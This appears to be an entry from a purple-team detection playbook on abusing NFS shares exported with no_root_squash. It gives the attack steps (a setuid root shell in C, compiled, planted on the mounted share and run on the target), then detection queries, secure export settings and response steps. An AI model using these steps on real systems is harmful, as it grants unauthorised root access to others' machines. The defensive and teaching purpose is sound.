name: Misc - NFS no_root_squash SUID Abuse
description: An NFS export with no_root_squash lets a root-owned SUID binary you create as root on your box run as root on the target. Mount the share, plant a SUID shell, execute it on the target.

steps.label: 2. Build SUID shell (attacker as root)
steps.command:
# shell.c: int main(){ setuid(0); setgid(0); system("/bin/bash"); }
gcc shell.c -o shell

steps.label: 3. Mount, plant SUID, execute on target
steps.command:
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
# on target:
./shell

defense.why_it_works: When an NFS share is exported with 'no_root_squash', the NFS server treats the client's root user as root on the server share (no UID mapping). An attacker who can mount the share as root on their own machine can create SUID binaries owned by root, then execute them on the target to gain root privileges.
defense.prerequisites: NFS share exported with no_root_squash in /etc/exports. Attacker has network access to the NFS port (2049) and root on their own machine to create SUID binaries.
defense.impact: Root shell on the target via SUID binary planted on the NFS share. The target user executes the SUID binary, which runs setuid(0) and drops a root shell.
defense.detection: showmount queries to the target NFS server from external IPs. Unexpected mount of NFS share from non-server IP. New SUID binary appearing on NFS-mounted share. Auditd: execution of SUID binary from NFS mount path.
defense.artifacts: NFS server log (mount from attacker IP) | Auditd: SUID binary executed from NFS path | Process log: setuid(0) call from user process
defense.splunk_spl:
index=linux sourcetype="nfs" ("mount" OR "showmount")
| table _time, host, src_ip, share

index=linux sourcetype="linux:auditd" type=SYSCALL syscall="execve"
| where match(exe, "(?i)/mnt/.*") AND euid=0
| table _time, host, exe, name
defense.elastic_kql: process.name:mount AND process.args:*nfs* OR (event.category:process AND process.executable:/mnt/* AND user.effective.id:0)
defense.sentinel_kql:
Syslog
| where SyslogMessage has_any ("mount -t nfs","showmount","no_root_squash")
| project TimeGenerated, Computer, SyslogMessage
| sort by TimeGenerated desc
// SUID binary planted on an NFS share then executed with setuid(0) from the mount path
defense.sigma_rules: lnx_nfs_no_root_squash_suid (SUID execution from an NFS mount)
defense.prevention: Never export NFS shares with no_root_squash unless strictly required. Use root_squash (default) which maps root to nfsnobody. Use nosuid mount option on NFS clients to prevent SUID execution from mounted shares. Restrict NFS exports to specific trusted host IPs only.
defense.misconfiguration: /etc/exports contains 'no_root_squash' for shares accessible to untrusted clients. NFS server does not restrict which hosts can mount the share.
defense.vulnerable_config:
# /etc/exports -- vulnerable
/tmp         *(rw,sync,no_root_squash)
# * allows any host to mount; no_root_squash preserves root UID
defense.secure_config:
# /etc/exports -- secure
/tmp         10.10.10.0/24(rw,sync,root_squash,nosuid,nodev)
# root_squash: maps remote root to nfsnobody
# nosuid: SUID bits on mounted files are ignored
# Restrict to specific subnet, not *
defense.evasion: Mount using showmount output to find the exported path. Transfer compiled shell binary via NFS mount from attacker's root shell.

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review Linux Audit (auditd), Windows Security Event Log for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Abuses an NFS export set to no_root_squash to run a root-owned SUID shell on the target:
  sudo mount -t nfs <ip>:/<share> /mnt   mount the export locally as root
With no_root_squash, files you create as root on the mount keep uid 0 on the server. Copy a SUID /bin/bash shell into the share, chmod u+s it, then execute it on the target for a root shell. showmount -e and /etc/exports confirm the flag.
